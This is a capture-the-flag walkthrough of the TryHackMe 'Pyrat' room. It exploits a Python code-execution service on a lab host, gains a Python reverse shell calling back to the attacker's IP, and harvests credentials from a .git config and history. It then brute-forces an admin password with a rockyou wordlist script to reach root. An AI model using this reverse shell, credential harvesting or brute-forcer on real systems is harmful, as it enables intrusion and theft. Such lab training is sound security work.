# TryHackMe: Pyrat Challenge

Room URL: https://tryhackme.com/room/pyrat

## Objective

There is an open HTTP server that has a python code execution vulnerability. Exploit this vulnerability to gain a shell to target machine, search for a credentials, and try to escalate your privileges.

## Enumeration

Starting with the enumeration. 

<img width="1220" height="549" alt="image" src="https://github.com/user-attachments/assets/a3a2b3e2-57e2-4634-ba60-c009fd764c15" />


```bash
─$ curl -I http://10.10.74.250:8000
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Mon Jul 21 08:50:52  2025
Content-type: text/html; charset=utf-8
Content-Length: 27

─$ curl -s http://10.10.74.250:8000
Try a more basic connection  
```

The web server is running a simple Python-based interface. The HTTP response provides a hint that a basic connection attempt—such as using Netcat—might reveal more information.
```bash
$ nc 10.10.74.250  8000
echo hello
invalid syntax (<string>, line 1)
whoami
name 'whoami' is not defined
```

This error confirms that this server is running in a Python environment.

```bash
nc 10.10.74.250  8000
print("hello")
hello
import sys

print(sys.version)
3.8.10 (default, Mar 18 2025, 20:04:55) 
[GCC 9.4.0]


```
This means we can do a Python code injection to gain a shell.

## Reverse Shell

```py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.8.180",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
    
```

<img width="1221" height="508" alt="image" src="https://github.com/user-attachments/assets/9b20e316-d2bb-4fe5-8a56-d72aa5b2f542" />

When searching for credentials or any sensitive data, `.git/` directory is a good starting point as it may contain:
- Old credentials (usernames/passwords, API keys, SSH keys) may have been committed and later deleted but still exist in Git history. you can recover them with 
```bash
git log
git show <commit>
git diff <commit>
```
- Configuration files -> `.git/config` might contain remote URLs with usernames and tokens. 
- Index inspection -> You can see tracked files even if they aren't in the working directory anymore: `git ls-files`. 

With that being said, let's start searching for credentials.
```bash
www-data@ip-10-10-74-250:/$ ls -al /opt
ls -al /opt
total 12
drwxr-xr-x  3 root  root  4096 Jun 21  2023 .
drwxr-xr-x 18 root  root  4096 Jul 21 08:43 ..
drwxrwxr-x  3 think think 4096 Jun 21  2023 dev
www-data@ip-10-10-74-250:/$ ls -al /opt/dev
ls -al /opt/dev
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
www-data@ip-10-10-74-250:/$ ls -al /opt/dev/.git
ls -al /opt/dev/.git
total 52
drwxrwxr-x 8 think think 4096 Jun 21  2023 .
drwxrwxr-x 3 think think 4096 Jun 21  2023 ..
drwxrwxr-x 2 think think 4096 Jun 21  2023 branches
-rw-rw-r-- 1 think think   21 Jun 21  2023 COMMIT_EDITMSG
-rw-rw-r-- 1 think think  296 Jun 21  2023 config
-rw-rw-r-- 1 think think   73 Jun 21  2023 description
-rw-rw-r-- 1 think think   23 Jun 21  2023 HEAD
drwxrwxr-x 2 think think 4096 Jun 21  2023 hooks
-rw-rw-r-- 1 think think  145 Jun 21  2023 index
drwxrwxr-x 2 think think 4096 Jun 21  2023 info
drwxrwxr-x 3 think think 4096 Jun 21  2023 logs
drwxrwxr-x 7 think think 4096 Jun 21  2023 objects
drwxrwxr-x 4 think think 4096 Jun 21  2023 refs
www-data@ip-10-10-74-250:/$ 
```

While exploring the git directory, I found some credentials in the `config` file.
```bash
www-data@ip-10-10-74-250:/opt/dev/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

Now we can SSH to the user think.

<img width="1228" height="798" alt="image" src="https://github.com/user-attachments/assets/aed8e83c-310d-479e-af8d-e5f705281402" />

```bash
think@ip-10-10-74-250:~$ ls
snap  user.txt
think@ip-10-10-74-250:~$ whoami
think
think@ip-10-10-74-250:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
think@ip-10-10-74-250:~$ sudo -l 
[sudo] password for think: 
Sorry, user think may not run sudo on ip-10-10-74-250.
```

## Privilege Escalation

Keep exploring the git directory. Use `git log` commands to view the git history.

```bash
think@ip-10-10-74-250:/opt/dev/.git$ git log
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint
think@ip-10-10-74-250:/opt/dev/.git$
think@ip-10-10-74-250:/opt/dev$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
think@ip-10-10-74-250:/opt/dev$ git ls-files
pyrat.py.old

```

We can recover deleted files with this git command: 
```bash
think@ip-10-10-74-250:/opt/dev$ git restore pyrat.py.old
think@ip-10-10-74-250:/opt/dev$ ls -al
total 16
drwxrwxr-x 3 think think 4096 Jul 21 10:51 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jul 21 10:51 .git
-rw-rw-r-- 1 think think  753 Jul 21 10:51 pyrat.py.old
think@ip-10-10-74-250:/opt/dev$ cat pyrat.py.old 
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```
This script functions as a switch-case controller based on the value of data. If the command is `some_endpoint`, it calls the `get_this_enpoint()` function, which—based on the code comments—corresponds to an admin endpoint and likely provides privileged access.

If the data doesn't match `some_endpoint`, the script checks whether it is running as the root user by evaluating `os.getuid() == 0`. If it is, it downgrades privileges by calling `change_uid()`.

After this check, if data is `shell`, it spawns a shell using the `shell()` function. Otherwise, it calls `exec_python()` to execute the received input as Python code. 

Since the older version of this server script includes internal logic and comments, we don’t need to guess the username—it's explicitly indicated in the code that 'some_endpoint' refers to the `admin`.

```bash                                                                        
                                                                              
┌──(kali㉿kali)-[~]
└─$ nc 10.10.74.250 8000
admin
Password:
1234
Password:
password
Password:
admin


admin
Start a fresh client to begin.
```
I created a simple Python script to fuzz the password. The script will try to connect to the target server. Once it's connected, it will send `admin` and check the response. If the response other than `password:`, then this is the correct password.
```py
import socket


TARGET_IP = '10.10.74.250'
TARGET_PORT = 8000
WORDLIST = '/usr/share/wordlists/rockyou.txt'


with open(WORDLIST, 'r', encoding="latin-1") as f:
    for password in f:
        password = password.strip()
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((TARGET_IP, TARGET_PORT))

            # Send admin
            s.sendall(b"admin\n")
            data = s.recv(4096).decode()
            
            # read password prompt
            if "Password:" in data:
                s.sendall((password + "\n").encode())
                data = s.recv(4096).decode()
                print(f"[TRY] Password: {password} | Response: {data.strip()}")

                if "Password:" not in data:
                    print(f"\n[SUCCESS] Password found: {password}")
                    break
            else:
                print("Error: unexpected response after sending username")
            
            s.close()
        except Exception as e:
            print("Error: %s " %e)
```

Run the fuzzer.

```bash
─$ python3 fuzzer.py
[TRY] Password: 123456 | Response: Password:
[TRY] Password: 12345 | Response: Password:
[TRY] Password: 123456789 | Response: Password:
[TRY] Password: password | Response: Password:
[TRY] Password: iloveyou | Response: Password:
[TRY] Password: princess | Response: Password:
[TRY] Password: 1234567 | Response: Password:
[TRY] Password: rockyou | Response: Password:
[TRY] Password: 12345678 | Response: Password:
[TRY] Password: abc123 | Response: Welcome Admin!!! Type "shell" to begin

[SUCCESS] Password found: abc123
```

Login with the correct username and password.
```bash
$ nc 10.10.74.250 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
```

Done!.
